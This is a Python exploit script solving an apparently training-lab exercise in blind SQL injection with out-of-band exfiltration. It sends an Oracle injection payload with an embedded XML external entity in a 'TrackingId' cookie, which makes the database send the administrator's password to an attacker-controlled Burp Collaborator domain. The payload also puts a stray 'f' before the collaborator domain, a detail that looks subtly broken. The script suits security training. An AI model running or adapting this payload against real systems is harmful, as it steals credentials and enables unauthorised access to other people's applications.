"""
  Lab: Blind SQL injection with out-of-band data exfiltration

  Steps:
  1. Inject payload into 'TrackingId' cookie to extract administrator password via DNS lookup
  2. Get the administrator password from your burp collaborator
  3. Login as administrator

  Author: D4mn20
"""
import argparse
import requests
from colorama import Fore
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url", required=True, help='Target URL')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--collaborator', required=True, help='Burp Collaborator domain')
    args = parser.parse_args()

    # Configure session with proxy if provided
    session = requests.session()
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
        session.proxies = proxies
    session.verify = False

    print("⦗#⦘ Injection point: " + Fore.YELLOW + "TrackingId")
    print(Fore.WHITE + "❯❯ Injecting payload to extract administrator password via DNS lookup.. ", end="", flush=True)

    payload = f"'||(SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM \"http://'||(select password from users where username = 'administrator')||'.f{args.collaborator}/\"> %25remote%3b]>'),'/l') FROM dual)-- -"
    cookies = { "TrackingId": payload }

    try:  
       session.get(f"{args.url}/filter?category=Pets", cookies=cookies)
        
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch the page with the injected payload through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 Check your burp collaborator for the administrator password then login")

if __name__ == "__main__":
    main()
